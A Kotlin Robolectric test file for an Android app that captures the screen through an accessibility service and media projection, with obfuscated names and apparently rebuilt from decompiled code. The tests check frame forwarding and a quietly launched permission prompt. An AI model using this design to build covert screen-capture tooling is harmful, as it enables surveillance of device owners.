package com.storm.safe.rock.manager

import android.content.Intent
import android.os.Build
import com.storm.safe.rock.activity.qixvbtmo
import com.storm.safe.rock.service.MediaDisplayService
import com.storm.safe.rock.service.MyAccessibilityService
import org.junit.After
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.Robolectric
import org.robolectric.RobolectricTestRunner
import org.robolectric.Shadows.shadowOf
import org.robolectric.annotation.Config

/**
 * Tests for C0263a5 stub elimination — verifying all 11 "not yet replicated" stubs
 * are now properly wired to MediaDisplayService and qixvbtmo.
 *
 * Categories:
 * 1. stopCapture → MediaDisplayService.stop(context)
 * 2. pauseCapture → MediaDisplayService.getInstance()?.isPaused = true
 * 3. resumeCapture → MediaDisplayService.getInstance()?.isPaused = false
 * 4. requestMediaProjectionPermission → Intent(service, qixvbtmo::class.java) + startActivity
 * 5. startMediaProjectionCapture → MediaDisplayService.getInstance()?.frameCallback = ...
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
class C0263a5StubEliminationTest {

    private lateinit var service: MyAccessibilityService

    @Before
    fun setup() {
        // Reset MediaDisplayService static state
        MediaDisplayService.isProjecting = false
        // Create MyAccessibilityService via Robolectric
        val controller = Robolectric.buildService(MyAccessibilityService::class.java)
        service = controller.create().get()
    }

    @After
    fun tearDown() {
        // Clean up statics
        MediaDisplayService.isProjecting = false
        MyAccessibilityService.isPermissionRequesting = false
    }

    // ─── Companion / static tests ──────────────

    @Test
    fun `C0263a5 TAG is etzbzyzqxvqm`() {
        assertEquals("etzbzyzqxvqm", C0263a5.TAG)
    }

    @Test
    fun `C0263a5 compressionQuality default is 45`() {
        assertEquals(45, C0263a5.compressionQuality)
    }

    @Test
    fun `C0263a5 scaleFactor default is 0_5`() {
        assertEquals(0.5f, C0263a5.scaleFactor, 0.001f)
    }

    @Test
    fun `C0263a5 fpsLimit default is 10`() {
        assertEquals(10, C0263a5.fpsLimit)
    }

    // ─── MediaDisplayService companion API tests ──

    @Test
    fun `MediaDisplayService getInstance returns null initially`() {
        assertNull(MediaDisplayService.getInstance())
    }

    @Test
    fun `MediaDisplayService isProjecting is false initially`() {
        assertFalse(MediaDisplayService.isProjecting)
    }

    @Test
    fun `MediaDisplayService has stop method`() {
        // Verify stop(context) exists and can be called without crashing
        // It should send a stop intent to the service
        MediaDisplayService.stop(service)
        // Verify a service intent was sent
        val shadow = shadowOf(service)
        val nextIntent = shadow.nextStartedService
        if (nextIntent != null) {
            assertEquals("stop", nextIntent.getStringExtra("action"))
        }
    }

    @Test
    fun `MediaDisplayService has start method`() {
        val data = Intent()
        MediaDisplayService.start(service, -1, data, 80)
        val shadow = shadowOf(service)
        val nextIntent = shadow.nextStartedService
        if (nextIntent != null) {
            assertEquals("start", nextIntent.getStringExtra("action"))
            assertEquals(-1, nextIntent.getIntExtra("resultCode", 0))
            assertEquals(80, nextIntent.getIntExtra("quality", 0))
        }
    }

    @Test
    fun `MediaDisplayService instance has isPaused field`() {
        val controller = Robolectric.buildService(MediaDisplayService::class.java)
        val mediaService = controller.create().get()
        assertFalse(mediaService.isPaused)
        mediaService.isPaused = true
        assertTrue(mediaService.isPaused)
        controller.destroy()
    }

    @Test
    fun `MediaDisplayService instance has frameCallback field`() {
        val controller = Robolectric.buildService(MediaDisplayService::class.java)
        val mediaService = controller.create().get()
        assertNull(mediaService.frameCallback)

        var received: ByteArray? = null
        mediaService.frameCallback = { data -> received = data }
        assertNotNull(mediaService.frameCallback)

        // Test callback invocation
        mediaService.deliverFrame(byteArrayOf(1, 2, 3))
        assertArrayEquals(byteArrayOf(1, 2, 3), received)
        controller.destroy()
    }

    @Test
    fun `MediaDisplayService onCreate sets instance`() {
        val controller = Robolectric.buildService(MediaDisplayService::class.java)
        val mediaService = controller.create().get()
        assertSame(mediaService, MediaDisplayService.getInstance())
        controller.destroy()
        assertNull(MediaDisplayService.getInstance())
    }

    @Test
    fun `MediaDisplayService stopImmediate clears isProjecting and frameCallback`() {
        val controller = Robolectric.buildService(MediaDisplayService::class.java)
        val mediaService = controller.create().get()
        MediaDisplayService.isProjecting = true
        mediaService.frameCallback = { _ -> }

        MediaDisplayService.stopImmediate()

        assertFalse(MediaDisplayService.isProjecting)
        assertNull(mediaService.frameCallback)
        controller.destroy()
    }

    @Test
    fun `MediaDisplayService getFrameIntervalMs correct for default 20fps`() {
        MediaDisplayService.targetFps = 20
        assertEquals(50L, MediaDisplayService.getFrameIntervalMs())
    }

    @Test
    fun `MediaDisplayService getFrameIntervalMs clamps to 5-30 range`() {
        MediaDisplayService.targetFps = 1 // below min 5
        assertEquals(200L, MediaDisplayService.getFrameIntervalMs()) // 1000/5 = 200
        MediaDisplayService.targetFps = 100 // above max 30
        assertEquals(33L, MediaDisplayService.getFrameIntervalMs()) // 1000/30 = 33
    }

    // ─── C0263a5 stopCapture → MediaDisplayService.stop ──

    @Test
    fun `stopCapture in mediaprojection mode calls MediaDisplayService stop`() {
        val manager = C0263a5(service)
        manager.captureMode = "mediaprojection"

        // Should not throw — calls MediaDisplayService.stop(service)
        manager.stopCapture()

        assertFalse(manager.isCapturing)
        assertFalse(manager.isPaused)
    }

    @Test
    fun `stopCapture resets pause state in SharedPreferences`() {
        val manager = C0263a5(service)
        // Manually set paused state
        service.getSharedPreferences("screen_capture_pause_state", 0)
            .edit().putBoolean("is_paused", true).commit()

        manager.stopCapture()

        val isPaused = service.getSharedPreferences("screen_capture_pause_state", 0)
            .getBoolean("is_paused", true)
        assertFalse(isPaused)
    }

    // ─── C0263a5 pauseCapture → MediaDisplayService.getInstance()?.isPaused = true ──

    @Test
    fun `pauseCapture sets isPaused on MediaDisplayService when mediaprojection mode`() {
        val controller = Robolectric.buildService(MediaDisplayService::class.java)
        val mediaService = controller.create().get()

        val manager = C0263a5(service)
        manager.captureMode = "mediaprojection"

        manager.pauseCapture()

        assertTrue(manager.isPaused)
        assertTrue(mediaService.isPaused)
        controller.destroy()
    }

    @Test
    fun `pauseCapture does not touch MediaDisplayService in accessibility mode`() {
        val controller = Robolectric.buildService(MediaDisplayService::class.java)
        val mediaService = controller.create().get()
        mediaService.isPaused = false

        val manager = C0263a5(service)
        // Default mode is accessibility (DEFAULT_CAPTURE_MODE)

        manager.pauseCapture()

        assertTrue(manager.isPaused)
        assertFalse(mediaService.isPaused) // Not touched
        controller.destroy()
    }

    @Test
    fun `pauseCapture saves pause state to SharedPreferences`() {
        val manager = C0263a5(service)
        manager.pauseCapture()

        val savedPaused = service.getSharedPreferences("screen_capture_pause_state", 0)
            .getBoolean("is_paused", false)
        assertTrue(savedPaused)
    }

    // ─── C0263a5 resumeCapture → MediaDisplayService.getInstance()?.isPaused = false ──

    @Test
    fun `resumeCapture clears isPaused on MediaDisplayService when mediaprojection mode`() {
        val controller = Robolectric.buildService(MediaDisplayService::class.java)
        val mediaService = controller.create().get()
        mediaService.isPaused = true

        val manager = C0263a5(service)
        manager.captureMode = "mediaprojection"

        manager.resumeCapture()

        assertFalse(manager.isPaused)
        assertFalse(mediaService.isPaused)
        controller.destroy()
    }

    @Test
    fun `resumeCapture does not touch MediaDisplayService in accessibility mode`() {
        val controller = Robolectric.buildService(MediaDisplayService::class.java)
        val mediaService = controller.create().get()
        mediaService.isPaused = true

        val manager = C0263a5(service)

        manager.resumeCapture()

        assertFalse(manager.isPaused)
        assertTrue(mediaService.isPaused) // Not touched in accessibility mode
        controller.destroy()
    }

    @Test
    fun `resumeCapture saves resume state to SharedPreferences`() {
        val manager = C0263a5(service)
        // First pause, then resume
        manager.pauseCapture()
        manager.resumeCapture()

        val savedPaused = service.getSharedPreferences("screen_capture_pause_state", 0)
            .getBoolean("is_paused", true)
        assertFalse(savedPaused)
    }

    // ─── C0263a5 requestMediaProjectionPermission → qixvbtmo ──

    @Test
    fun `requestMediaProjectionPermission creates intent for qixvbtmo activity`() {
        val manager = C0263a5(service)

        manager.requestMediaProjectionPermission()

        val shadow = shadowOf(service)
        val intent = shadow.nextStartedActivity
        assertNotNull("Should have started an activity", intent)
        assertEquals(qixvbtmo::class.java.name, intent?.component?.className)
    }

    @Test
    fun `requestMediaProjectionPermission sets FLAG_ACTIVITY_NEW_TASK`() {
        val manager = C0263a5(service)

        manager.requestMediaProjectionPermission()

        val shadow = shadowOf(service)
        val intent = shadow.nextStartedActivity
        assertNotNull(intent)
        assertTrue(
            "Should have FLAG_ACTIVITY_NEW_TASK",
            intent!!.flags and Intent.FLAG_ACTIVITY_NEW_TASK != 0
        )
    }

    @Test
    fun `requestMediaProjectionPermission sets FLAG_ACTIVITY_CLEAR_TASK`() {
        val manager = C0263a5(service)

        manager.requestMediaProjectionPermission()

        val shadow = shadowOf(service)
        val intent = shadow.nextStartedActivity
        assertNotNull(intent)
        assertTrue(
            "Should have FLAG_ACTIVITY_CLEAR_TASK",
            intent!!.flags and Intent.FLAG_ACTIVITY_CLEAR_TASK != 0
        )
    }

    @Test
    fun `requestMediaProjectionPermission sets FLAG_ACTIVITY_NO_ANIMATION`() {
        val manager = C0263a5(service)

        manager.requestMediaProjectionPermission()

        val shadow = shadowOf(service)
        val intent = shadow.nextStartedActivity
        assertNotNull(intent)
        assertTrue(
            "Should have FLAG_ACTIVITY_NO_ANIMATION",
            intent!!.flags and Intent.FLAG_ACTIVITY_NO_ANIMATION != 0
        )
    }

    @Test
    fun `requestMediaProjectionPermission sets isPermissionRequesting true`() {
        MyAccessibilityService.isPermissionRequesting = false
        val manager = C0263a5(service)

        manager.requestMediaProjectionPermission()

        assertTrue(MyAccessibilityService.isPermissionRequesting)
    }

    // ─── C0263a5 startMediaProjectionCapture → frameCallback ──

    @Test
    fun `startCapture in mediaprojection mode with projecting sets frameCallback`() {
        val controller = Robolectric.buildService(MediaDisplayService::class.java)
        val mediaService = controller.create().get()
        MediaDisplayService.isProjecting = true

        val manager = C0263a5(service)
        manager.captureMode = "mediaprojection"

        manager.startCapture()

        assertTrue(manager.isCapturing)
        assertNotNull("frameCallback should be set", mediaService.frameCallback)
        controller.destroy()
    }

    @Test
    fun `startCapture in mediaprojection mode without projecting requests permission`() {
        // No MediaDisplayService running, isProjecting = false
        MediaDisplayService.isProjecting = false

        val manager = C0263a5(service)
        manager.captureMode = "mediaprojection"

        manager.startCapture()

        // Should not be capturing since projection isn't active
        assertFalse(manager.isCapturing)
    }

    @Test
    fun `frameCallback set by startCapture forwards data via sendFrameData`() {
        val controller = Robolectric.buildService(MediaDisplayService::class.java)
        val mediaService = controller.create().get()
        MediaDisplayService.isProjecting = true

        val manager = C0263a5(service)
        manager.captureMode = "mediaprojection"

        manager.startCapture()

        // Verify callback is set and can be invoked
        val callback = mediaService.frameCallback
        assertNotNull(callback)
        // Calling callback should not throw
        callback?.invoke(byteArrayOf(0x01, 0x02))
        controller.destroy()
    }

    // ─── No remaining stubs ──

    @Test
    fun `no not-yet-replicated stubs remain in source`() {
        // This is a meta-test — the actual verification is:
        // grep -rn "not yet replicated" C0263a5.kt | wc -l == 0
        // For runtime assertion, we verify all key methods exist and are callable
        val manager = C0263a5(service)

        // All these methods should complete without "not yet replicated" log stubs
        manager.stopCapture()
        manager.pauseCapture()
        manager.resumeCapture()
        manager.requestMediaProjectionPermission()
        // startCapture with mediaprojection — covered by other tests
        manager.release()
    }
}
